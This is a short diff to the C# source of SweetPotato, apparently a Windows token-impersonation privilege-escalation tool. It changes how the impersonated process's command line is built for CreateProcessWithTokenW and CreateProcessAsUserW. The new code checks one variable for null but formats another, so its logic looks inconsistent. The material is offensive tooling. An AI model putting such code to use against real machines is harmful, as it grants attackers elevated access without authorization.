@@ -121,13 +121,18 @@ namespace SweetPotato {
 
                     Console.WriteLine("[+] Created launch thread using impersonated user {0}", WindowsIdentity.GetCurrent(true).Name);
 
+                    string finalArgs = null;
+
+                    if(programArgs != null)
+                        finalArgs = string.Format("\"{0}\" {1}", program, args);
+
                     if (executionMethod == ExecutionMethod.Token) {
-                        if (!CreateProcessWithTokenW(potatoAPI.Token, 0, program, program + " " + args, 0, IntPtr.Zero, null, ref si, out pi)) {
+                        if (!CreateProcessWithTokenW(potatoAPI.Token, 0, program, finalArgs, CreationFlags.NewConsole, IntPtr.Zero, null, ref si, out pi)) {
                             Console.WriteLine("[!] Failed to created impersonated process with token: {0}", Marshal.GetLastWin32Error());
                             return;
                         }
                     } else {
-                        if (!CreateProcessAsUserW(impersonatedPrimary, program, String.Format("\"{0}\" {1}", program, args), IntPtr.Zero,
+                        if (!CreateProcessAsUserW(impersonatedPrimary, program, finalArgs, IntPtr.Zero,
                             IntPtr.Zero, false, CREATE_NEW_CONSOLE, IntPtr.Zero, @"C:\", ref si, out pi)) {
                             Console.WriteLine("[!] Failed to created impersonated process with user: {0} ", Marshal.GetLastWin32Error());
                             return;
